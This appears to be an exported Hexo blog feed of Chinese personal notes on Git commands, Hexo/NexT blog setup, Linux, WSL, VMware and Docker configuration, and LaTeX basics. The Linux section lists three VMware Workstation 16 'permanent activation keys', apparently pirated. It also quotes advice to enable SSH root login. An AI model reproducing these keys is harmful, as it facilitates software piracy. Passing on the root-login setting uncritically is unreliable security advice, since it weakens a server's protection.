    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/Git%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>distributed versoin control system（分布式版本控制系统）</p>
</blockquote>
<h1>1 初始化</h1>
<h3 id="1-1-1-配置">1.1.1 配置</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yuyg&quot;</span><br><span class="line">git config --global user.email &quot;1632508233@qq.com&quot;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.youtube.com/watch?v=CnMpARAOhFg">Git Intro - Part 2 - YouTube</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status                          # To see what needs to be added or committed.</span><br><span class="line">git add &lt;filepath&gt;                  # To add, or stage, any modified files.</span><br><span class="line">git commit -m &quot;Commit message&quot;      # To commit changes.</span><br><span class="line">git push</span><br><span class="line"></span><br><span class="line">git log                             #查看commit提交日志</span><br><span class="line">git checkout (commit ID)  #切换分支</span><br><span class="line">git checkout master</span><br><span class="line"></span><br><span class="line">touch a.txt</span><br><span class="line">cat a.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292003505.png" alt="image-20230329200310434"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292013895.png" alt="image-20230329201305806"></p>
<p><a href="https://www.cnblogs.com/wangiqngpei557/p/6056624.html">聊下git pull --rebase - 王清培 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init 初始化</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加文件到暂存区</span></span><br><span class="line">git add .			当前目录所有文件</span><br><span class="line">git add filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">撤销添加到暂存区的文件</span></span><br><span class="line">git reset .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看添加状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把文件提交到仓库</span></span><br><span class="line"> git commit -m message</span><br><span class="line"> git commit -m &quot;[base] commit&quot;</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看提交状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从最近到最远显示提交日志</span></span><br><span class="line">git log</span><br><span class="line">git log -pretty=oneline		每次提交显示为一行</span><br><span class="line"></span><br><span class="line">还未commit的文件</span><br><span class="line">git rm --cached . -r  删除add的文件</span><br><span class="line">git rm --cached “文件路径”，不删除物理文件，仅将该文件从缓存中删除；</span><br><span class="line">git rm --f “文件路径”，不仅将该文件从缓存中删除，还会将物理文件删除（不会回收到垃圾桶）</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292051791.png" alt="image-20230329205129717"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292051832.png" alt="image-20230329205152756"></p>
<p>文件回退</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout aa60287c2f031974fb034290bfa3c2f24823f9cb -f lab1/Collatz.java</span><br><span class="line">git checkout aa60287c2f031974fb034290bfa3c2f24823f9cb -- lab1/Collatz.java</span><br></pre></td></tr></table></figure>
<h2 id="1-2-版本回退">1.2 版本回退</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^		回退到上个版本</span><br><span class="line">git reset --hard HEAD^^		回退到上上个版本</span><br><span class="line">git reset --hard HEAD~1</span><br><span class="line"></span><br><span class="line">git reset --hard 版本号	 	回退到最新版本</span><br><span class="line"></span><br><span class="line">git reflog					查看版本号</span><br></pre></td></tr></table></figure>
<h2 id="1-3-远程仓库">1.3 远程仓库</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add [shortname] [url]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">origin为远程仓库的别名</span></span><br><span class="line">git remote add origin git@github.com:destiny0118/Few-shot-Image-Segmentation.git</span><br><span class="line"></span><br><span class="line">git branch -M master</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-u参数，把本地的master分支推送到远程新的master分支，将本地master分支与远程master分支关联起来</span></span><br><span class="line">git push -u origin master</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git remote -v			查看远程仓库信息</span><br><span class="line">git remote rm origin	删除已有的远程仓库</span><br></pre></td></tr></table></figure>
<h2 id="1-4-git-push">1.4 git push</h2>
<p><a href="https://www.runoob.com/git/git-push.html">git push 命令 | 菜鸟教程 (runoob.com)</a></p>
<p><strong>git push</strong> 命用于从将本地的分支版本上传到远程并合并。</p>
<p>命令格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果本地分支名与远程分支名相同，则可以省略冒号：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">git push <span class="tag">&lt;<span class="name">远程主机名</span>&gt;</span> <span class="tag">&lt;<span class="name">本地分支名</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>git push origin master：refs/for/master<br>
即是将本地的master分支推送到远程主机origin上的对应master分支， origin 是远程主机名  第一个master是本地分支名，第二个master是远程分支名。</p>
</li>
<li class="lvl-3">
<p>git push origin master<br>
如果远程分支被省略，如上则表示将本地分支推送到与之存在追踪关系的远程分支（通常两者同名），如果该远程分支不存在，则会被新建</p>
</li>
<li class="lvl-3">
<p>git push origin ：refs/for/master<br>
如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支，等同于 git push origin --delete master</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-2">
<p>克隆GitHub的仓库到本地</p>
<p><code>git clone + 仓库地址</code></p>
</li>
<li class="lvl-2">
<p>查看本地仓库关联的远程仓库信息</p>
<p><code>git remote -v</code></p>
</li>
<li class="lvl-2">
<p>查看分支</p>
<p><code>git branch</code></p>
</li>
<li class="lvl-2">
<p>创建分支</p>
<p><code>git branch+分支名</code></p>
</li>
<li class="lvl-2">
<p>设置别名</p>
<p><code>git config --global alias.br branchcat -n ~/.gitconfig</code></p>
</li>
</ul>
<h2 id="1-5-git-branch">1.5 git branch</h2>
<p><a href="http://www.hangdaowangluo.com/archives/491">Git branch命令的用法总结 | 精彩每一天 (hangdaowangluo.com)</a></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>git branch -a</p>
<p>查看所有分支</p>
</li>
<li class="lvl-2">
<p>git branch 分支名</p>
<p>仅创建分支</p>
</li>
<li class="lvl-2">
<p>git checkout 分支名</p>
<p>切换分支</p>
</li>
</ul>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/pic/git%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE1.png" alt="git命令思维导图1"></p>
<p>pulling and collaborating with other people</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292116146.png" alt="image-20230329211657074"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2013/202303292117667.png" alt="image-20230329211738590"></p>
<h1>2 git reset</h1>
<blockquote>
<p>git add撤销</p>
</blockquote>
<p>git reset：用于将当前HEAD复位到指定状态。一般用于撤消之前的一些操作(如：git add,git commit等)。</p>
<p>[如何在 Git 中取消暂存文件？ - 知乎 (<a href="http://zhihu.com">zhihu.com</a>)](<a href="https://zhuanlan.zhihu.com/p/638297266#:~:text=git">https://zhuanlan.zhihu.com/p/638297266#:~:text=git</a> restore --staged &lt;文件名&gt;,替换 &lt;文件名&gt; 为要取消暂存的文件名。 执行该命令后，Git将会将文件从暂存区移除，但保留对文件的修改。)</p>
<h1>3 detached游离节点提交</h1>
<p><a href="https://blog.csdn.net/zyb2017/article/details/78307688">Git —游离状态下的commit 分支切换与找回_git 代码提交到了游离分支怎么挽回-CSDN博客</a></p>
<p>git branch callback commit_id   //利用commit_id创建新分支<br>
git checkout dev<br>
git merge callback<br>
git push<br>
git branch -d callback    //删除分支</p>
<h1>4 branch</h1>
<p>删除分支：git branch -d [branch name]</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/Hexo%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1>1 Hexo使用</h1>
<ol>
<li class="lvl-3">安装node.js</li>
<li class="lvl-3">创建github page页面<code>destiny0118.github.io</code></li>
<li class="lvl-3">安装hexo    <code>npm install -g hexo-cli</code></li>
<li class="lvl-3">初始化博客路径<br>
hexo init blog<br>
cd blog<br>
npm install # npm install命令会把X包安装到node_modules目录中<br>
本地运行  hexo s -p 5555本地运行</li>
<li class="lvl-4">npm install hexo-deployer-git --save</li>
</ol>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">清除缓存: hexo clean</span></span><br><span class="line"><span class="section">生成: hexo g</span></span><br><span class="line"><span class="section">预览:  hexo s</span></span><br><span class="line"><span class="section">部署:  hexo d</span></span><br></pre></td></tr></table></figure>
<h1>2 基本功能</h1>
<h2 id="2-1-添加搜索功能">2.1 添加搜索功能</h2>
<p>npm install hexo-generator-searchdb --save</p>
<h1>3 支持Callout语法</h1>
<p><a href="https://uuanqin.top/p/d4bc55f2/index.html">Hexo 博客适配 Obsidian 新语法 | 半方池水半方田 (uuanqin.top)</a></p>
<h1>4 Hexo博客主题NexT使用自定义的CSS样式</h1>
<p><a href="https://segmentfault.com/a/1190000003846777">markdown - Hexo博客主题NexT使用自定义的CSS样式 - Magicer - SegmentFault 思否</a></p>
<h1>5 Markdown语法</h1>
<p><a href="https://forum-zh.obsidian.md/t/topic/435">MarkDown语法 超详细教程 - 经验分享 - Obsidian 中文论坛</a></p>
<p><a href="https://pkmer.cn/Pkmer-Docs/02-%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%E5%9F%BA%E7%A1%80/markdown/obsidian%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95/">PKMer_Obsidian 扩展语法</a></p>
<h2 id="5-1-Callout">5.1 Callout</h2>
<p><a href="https://uuanqin.top/p/d4bc55f2/index.html">Hexo 博客适配 Obsidian 新语法 | 半方池水半方田 (uuanqin.top)</a></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">npm un hexo-renderer-marked <span class="comment">--save</span></span><br><span class="line">npm i hexo-renderer-markdown-<span class="keyword">it</span>-plus <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
<p><a href="https://help.obsidian.md/Editing+and+formatting/Callouts">Callouts - Obsidian Help</a></p>
<blockquote>
<p>[!info]</p>
</blockquote>
<blockquote>
<p>[!note]</p>
</blockquote>
<blockquote>
<p>[!tip]</p>
</blockquote>
<blockquote>
<p>[!question]</p>
</blockquote>
<blockquote>
<p>[!todo]</p>
</blockquote>
<blockquote>
<p>[!example]</p>
</blockquote>
<blockquote>
<p>[!abstract]</p>
</blockquote>
<blockquote>
<p>[!warning]</p>
</blockquote>
<blockquote>
<p>[!success]</p>
</blockquote>
<blockquote>
<p>[!quote]</p>
</blockquote>
<h1>6 Hexo高级渲染</h1>
<p><a href="https://blog.csdn.net/qq_42951560/article/details/123596899">【Hexo】选择更高级的Markdown渲染器_hexo-renderer-marked-CSDN博客</a><br>
<a href="https://blog.csdn.net/qq_36667170/article/details/105846999">hexo 更换 markdown渲染器 @upupming/hexo-renderer-markdown-it-plus_hexo render-CSDN博客</a></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line"><span class="name">D</span>:\Hexo\Destiny\themes\hexo-theme-next\source\css\_common\components\post\index.styl</span><br></pre></td></tr></table></figure>
<p>修改颜色属性</p>
<div class="tips">
<p><strong>提示</strong><br>
这是一个提示</p>
</div>
<p>​</p>
<div class="warning">
<p><strong>注意</strong><br>
这是一个警告</p>
</div>
<p>​</p>
<div class="danger">
<p><strong>警告</strong><br>
这是一个危险信号</p>
</div>
<p>​</p>
<div class="success">
<p><strong>成功</strong><br>
这是一个成功信号</p>
</div>
<p>​</p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406062347265.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://hexo.io/zh-cn/docs/">Hexo文档</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/02bb9eaa0f51">hexo博客添加评论功能</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/crazy_scott/article/details/79293576">hexo下LaTeX无法显示的解决方案</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/u014155600/article/details/128972156">hexo渲染Latex公式（最简单方法）_仅参考_hexo katex-CSDN博客</a></p>
</li>
<li class="lvl-2">
<p><a href="https://yscoder.github.io/20150514/hexo-toc.html">设置TOC</a></p>
</li>
<li class="lvl-2">
<p><a href="%5BHexo%20%E9%83%A8%E7%BD%B2%E7%9A%84%E6%97%B6%E5%80%99%E5%8F%91%E7%94%9F%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%20-%20%E7%AE%80%E4%B9%A6%20(jianshu.com)%5D(https://www.jianshu.com/p/9afb3257133b)">warning: LF will be replaced by CRLF in xxxx</a></p>
</li>
</ul>
<h1>7 主题</h1>
<h2 id="7-1-Next">7.1 Next</h2>
<h3 id="7-1-1-菜单">7.1.1 菜单</h3>
<h4 id="增加菜单项目">增加菜单项目</h4>
<p><code>_config.yml</code></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">home:</span> / || home</span><br><span class="line"><span class="meta">#about: /about/ || user</span></span><br><span class="line"><span class="symbol">tags:</span> <span class="keyword">/tags/</span> || tags</span><br><span class="line"><span class="meta">#categories: /categories/ || th</span></span><br><span class="line"><span class="symbol">archives:</span> <span class="keyword">/archives/</span> || archive</span><br><span class="line"><span class="meta">#schedule: /schedule/ || calendar</span></span><br><span class="line"><span class="meta">#sitemap: /sitemap.xml || sitemap</span></span><br><span class="line"><span class="meta">#commonweal: /404/ || heartbeat</span></span><br></pre></td></tr></table></figure>
<p>新建页面<code>tags</code>：<code>hexo new page &quot;tags&quot;</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">title</span>: tags </span><br><span class="line"><span class="attribute">date</span>: <span class="number">2019</span>-<span class="number">02</span>-<span class="number">18</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">41</span></span><br><span class="line"><span class="attribute">type</span>: tags</span><br></pre></td></tr></table></figure>
<h4 id="更改菜单名称">更改菜单名称</h4>
<p><code>next/languages/zh-CN.yml</code></p>
<h3 id="7-1-2-NexT美化教程">7.1.2 NexT美化教程</h3>
<p><a href="https://sspai.com/post/85116#!">Hexo+Github Page｜基础教程(二)：NexT 主题基本美化｜全网最细致全面的教程 - 少数派 (sspai.com)</a></p>
<p><a href="https://www.jianshu.com/p/3a05351a37dc">Hexo的Next主题详细配置 - 简书 (jianshu.com)</a></p>
<h1>8 部署出错</h1>
<h2 id="8-1-fatal-unable-to-access-‘https-github-com-…-git’-Could-not-resolve-host-github-com">8.1 fatal: unable to access ‘<a href="https://github.com/.../.git">https://github.com/…/.git</a>’: Could not resolve host: <a href="http://github.com">github.com</a></h2>
<blockquote>
<p>git config --global --unset http.proxy</p>
<p>git config --global --unset https.proxy</p>
</blockquote>
<blockquote>
<p>git config --global http.proxy</p>
<p>git config --global https.proxy</p>
</blockquote>
<ul class="lvl-0">
<li class="lvl-2">
<p>OpenSSL SSL_connect Connection was reset</p>
<p><a href="https://blog.csdn.net/weixin_43945983/article/details/110882074">解除SSL认证</a></p>
<p><a href="https://blog.csdn.net/m0_46233340/article/details/114926427">设置一下http.proxy</a></p>
<p><a href="https://blog.csdn.net/Candle_light/article/details/114992784">生成SSH</a></p>
</li>
</ul>
<p><a href="https://www.jianshu.com/p/42a4efcdf8d7">解决Hexo博客文章置顶问题 - 简书 (jianshu.com)</a></p>
<p><a href="https://blog.csdn.net/qwerty200696/article/details/79010629">hexo博客优化之文章置顶+置顶标签_qwerty200696的博客-CSDN博客_hexo 置顶</a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1>1 Linux环境配置</h1>
<h1>2 Linux</h1>
<h2 id="2-1-VMware-Workstation-16-永久激活密钥">2.1 VMware Workstation 16 永久激活密钥</h2>
<p>ZF3R0-FHED2-M80TY-8QYGC-NPKYF</p>
<p>YF390-0HF8P-M81RQ-2DXQE-M2UT6</p>
<p>ZF71R-DMX85-08DQY-8YMNC-PPHV8<br>
链接：<a href="https://www.jianshu.com/p/002ede3e0b17">https://www.jianshu.com/p/002ede3e0b17</a></p>
<h2 id="2-2-创建root用户">2.2 创建root用户</h2>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">sudo passwd<span class="built_in"> root</span></span><br><span class="line">su<span class="built_in"> root</span>				//切换<span class="built_in">到root</span></span><br></pre></td></tr></table></figure>
<h2 id="2-3-内存管理">2.3 内存管理</h2>
<table>
<thead>
<tr>
<th>free</th>
<th>内存容量统计信息</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="2-4-进程管理命令">2.4 进程管理命令</h2>
<h1>3 备份还原Linux子系统</h1>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wsl  //进入默认的linux发行版</span><br><span class="line">wsl -l  //列出已安装的linux发行版</span><br><span class="line">wsl --shutdown  //终止正在运行的wsl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wsl --export Ubuntu-22.04 F:/export.tar  //导出需要迁移的Linux发行版</span><br><span class="line"></span><br><span class="line">wsl --import &lt;DistributionName&gt; &lt;InstallLocation&gt; &lt;FileName&gt;</span><br><span class="line">wsl --import Ubuntu F:/Cache/WSL F:/export.tar</span><br><span class="line">（将FileName安装到InstallLocation位置，新的发行版名称DistributionName）</span><br><span class="line">Ubuntu config --default-user &#123;你原来的用户名&#125;</span><br><span class="line"></span><br><span class="line">wsl --unregister Ubuntu</span><br></pre></td></tr></table></figure>
<p><a href="https://www.xfy-learning.com/2020/05/30/WSL%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/">WSL备份与还原 | 小肥羊吃草不吃肉 (xfy-learning.com)</a><br>
<a href="https://zhuanlan.zhihu.com/p/406917270">WSL的安装和位置迁移 - 知乎 (zhihu.com)</a></p>
<h1>4 Linux安装Go</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /mnt/d/Downloads</span><br><span class="line">tar -C /usr/local/go -zxvf go1.21.6.linux-amd64.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//配置环境变量： Linux下有两个文件可以配置环境变量，其中`/etc/profile`是对所有用户生效的；`<span class="variable">$HOME</span>/.profile`是对当前用户生效的，根据自己的情况自行选择一个文件打开，添加如下两行代码，保存退出。</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/go</span><br><span class="line"><span class="built_in">export</span> GOBIN=<span class="variable">$GOPATH</span>/bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/local/go</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin</span><br></pre></td></tr></table></figure>
<p>go run mrsequential.go <a href="http://wc.so">wc.so</a> pg*.txt</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">[linux修改文件夹下所有文件的权限（常用）_linux如何把文件夹的权限设置为可执行-CSDN博客](https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_41996454/</span>article<span class="regexp">/details/</span><span class="number">109689314</span>)</span><br><span class="line"><span class="comment">## 虚拟机</span></span><br><span class="line"></span><br><span class="line">windows安装wsl与vmware兼容问题</span><br><span class="line"></span><br><span class="line">关闭windows的Hyper-V功能重启电脑就好了。</span><br><span class="line"></span><br><span class="line">![img](https:<span class="regexp">//gi</span>tee.com<span class="regexp">/destiny0118/</span>picgo<span class="regexp">/raw/m</span>aster/<span class="number">202112311754154</span>.jpeg)</span><br><span class="line"></span><br><span class="line">传输 (VMDB)错误 -<span class="number">14</span>: Pipe connection has been broken。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bcdedit /set hypervisorlaunchtype off<br>
bcdedit /set hypervisorlaunchtype auto<br>
bcdedit /enum {current}			查看是否启动</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-tag">wsl</span> <span class="selector-tag">-l</span> <span class="selector-tag">-v</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[(10条消息) WSL修改默认安装目录到其他盘_Login5&amp;R的博客-CSDN博客]</span>(<span class="attribute">https</span>:<span class="comment">//blog.csdn.net/qq_33157391/article/details/120728021)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Ubuntu root<span class="variable">@localhost</span>‘s <span class="attribute">password</span>: Permission denied,please try again.</span><br><span class="line"></span><br><span class="line">&gt; - 修[ssh](<span class="attribute">https</span>:<span class="comment">//so.csdn.net/so/search?q=ssh&amp;spm=1001.2101.3001.7020)改配置文件，设置为允许root远程登录：</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;   root@[ubuntu](<span class="attribute">https</span>:<span class="comment">//so.csdn.net/so/search?q=ubuntu&amp;spm=1001.2101.3001.7020):~# vim /etc/ssh/sshd_config</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;   新增语句：PermitRootLogin yes 即可。</span><br><span class="line">&gt;</span><br><span class="line">&gt; - 保存退出，重启ssh服务：</span><br><span class="line">&gt;</span><br><span class="line">&gt;   root<span class="variable">@ubuntu</span>:~# /etc/init.d/ssh restart</span><br><span class="line"></span><br><span class="line"># ubuntn</span><br><span class="line"></span><br><span class="line">## <span class="number">1</span>. 问题</span><br><span class="line"></span><br><span class="line">&gt; 无法在宿主环境与虚拟环境之间复制粘贴</span><br><span class="line">&gt; 解决方案</span><br><span class="line">&gt;</span><br><span class="line">&gt; 在Ubuntu的命令行中执行一下命令</span><br><span class="line"></span><br><span class="line"><span class="built_in">``</span>`shell</span><br><span class="line">sudo apt-get autoremove open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop</span><br><span class="line">#重启虚拟机</span><br></pre></td></tr></table></figure>
<h2 id="4-1-字体太小">4.1 字体太小</h2>
<blockquote>
<p>sudo apt-get install unity-tweak-tool</p>
</blockquote>
<h2 id="4-2-fatal-error-bits-libc-header-start-h-没有那个文件或目录">4.2 fatal error: bits/libc-header-start.h: 没有那个文件或目录</h2>
<blockquote>
<p>sudo apt-get install gcc-multilib</p>
</blockquote>
<h2 id="4-3-更新镜像源">4.3 更新镜像源</h2>
<blockquote>
<p>sudo apt-get update<br>
这个命令，会访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。</p>
<p>update后，可能需要upgrade一下。</p>
<p>sudo apt-get upgrade<br>
这个命令，会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。如果你的软件都是最新版本，会提示：</p>
</blockquote>
<h2 id="4-4-右键创建文件">4.4 右键创建文件</h2>
<p><img src="https://gitee.com/destiny0118/picgo/raw/master/202112122146080.png" alt="image-20211212214603969"></p>
<h3 id="4-4-1-vmware-tools为灰色">4.4.1 vmware-tools为灰色</h3>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/img/image-20220922095348465.png" alt="image-20220922095348465" style="zoom: 50%;" />
<p>登录虚拟机后安装</p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>tar -zxvf 加压缩相应安装包</p>
</li>
<li class="lvl-2">
<p>进入解压缩后的安装包</p>
</li>
<li class="lvl-2">
<p>./vmware-install.pl安装</p>
</li>
</ul>
</blockquote>
<h2 id="4-5-Centos7">4.5 Centos7</h2>
<h3 id="4-5-1-更新阿里源">4.5.1 更新阿里源</h3>
<p><a href="https://blog.csdn.net/wade3015/article/details/94494929">(6条消息) CentOS 更新yum源及yum命令详解_TigerwolfC的博客-CSDN博客_centos更新yum源</a></p>
<p><a href="https://blog.csdn.net/qq_41954264/article/details/107392579?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">(6条消息) 修改CentOS默认yum源为国内镜像_qq_41954264的博客-CSDN博客</a></p>
<h1>5 docker</h1>
<p><a href="https://www.cnblogs.com/lyx666/p/12764442.html">docker镜像原理 镜像制作 dockerfile - 李狗蛋+1 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/dyb0204/p/11345129.html">Docker在ubuntu和centos的安装 - 弑小君 - 博客园 (cnblogs.com)</a></p>
<h2 id="5-1-CentOS-Docker-安装">5.1 CentOS Docker 安装</h2>
<p><a href="https://www.runoob.com/docker/centos-docker-install.html">CentOS Docker 安装</a></p>
<p>[DockerFile简介](<a href="https://www.cnblogs.com/dongzhanyi123/p/13301748.html">docker-通过编辑dockerfile自动生成镜像 - An.amazing.rookie - 博客园 (cnblogs.com)</a>)</p>
<p>[Docker基本概念](<a href="https://blog.csdn.net/sehejs_a/article/details/104857028">(6条消息) Docker基本概念_useradd的博客-CSDN博客_docker useradd</a>)</p>
<p>[Docker在ubuntu和centos的安装](<a href="https://www.cnblogs.com/dyb0204/p/11345129.html">Docker在ubuntu和centos的安装 - 弑小君 - 博客园 (cnblogs.com)</a>)</p>
<p>docker免密登录</p>
<p><a href="https://blog.csdn.net/zytmaster/article/details/106170908">(6条消息) 新建centos7的虚拟机安装docker后无法启动，报错：Failed to start docker.service: Unit not found_zytmaster的博客-CSDN博客</a></p>
<h2 id="5-2-Singularity-Container">5.2 Singularity Container</h2>
<p>[Singularity Container](<a href="https://sylabs.io/guides/2.6/user-guide/quick_start.html">Quick Start — Singularity container 2.6 documentation (sylabs.io)</a>)</p>
<p>[singularity](<a href="https://www.jianshu.com/p/5b5e2f1bd057?from=singlemessage">singularity - 简书 (jianshu.com)</a>)</p>
<p><a href="https://sylabs.io/guides/3.3/user-guide/mpi.html">Singularity and MPI applications 官网文件</a>)</p>
<p>[Singularity和MPI应用 简书](<a href="https://www.jianshu.com/p/0882e65c5e0e">Singularity和MPI应用 - 简书 (jianshu.com)</a>)</p>
<p><a href="http://hmli.ustc.edu.cn/doc/mpi/openmpi-install.htm">openMPI安装系统环境变量、个人环境变量Open MPI安装使用 </a>)</p>
<p>def文件更新慢</p>
<p><a href="https://blog.csdn.net/nidongla/article/details/117930231?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">(6条消息) 从零开始制作PyTorch的Singularity容器镜像_nidongla的博客-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title>LaTex语法</title>
    <url>/2023/02/28/%E5%B7%A5%E5%85%B7/LaTex%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<ul class="lvl-0">
<li class="lvl-2">
<p>inline 行间公式：$…$</p>
</li>
<li class="lvl-2">
<p>display 块间公式：$$…$$</p>
</li>
</ul>
<p><a href="https://blog.csdn.net/happyday_d/article/details/83715440">Typora中利用LaTeX 插入数学公式</a></p>
<p><a href="https://www.jianshu.com/p/5207a41baf51/">VSCODE+latex 自动换行 - 简书 (jianshu.com)</a></p>
<h1>1 历史版本</h1>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/tex-historic-archive/systems/texlive/2020/">Index of /tex-historic-archive/systems/texlive/2020/ | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/136931926">TexLive 2020 安装指南 - 知乎 (zhihu.com)</a></p>
<h1>2 Latex排版</h1>
<p><a href="https://www.zhihu.com/question/31850346">LaTeX（XeLaTeX）写的文档如何一键转为word？ - 知乎 (zhihu.com)</a></p>
<h2 id="2-1-换行">2.1 换行</h2>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\\</span> 换行</span><br><span class="line"><span class="keyword">\par</span> 	换行并缩进</span><br><span class="line"></span><br><span class="line">abc <span class="built_in">&amp;</span>= </span><br><span class="line">	<span class="built_in">&amp;</span>=</span><br><span class="line">等号对齐</span><br></pre></td></tr></table></figure>
<h2 id="2-2-插入图片">2.2 插入图片</h2>
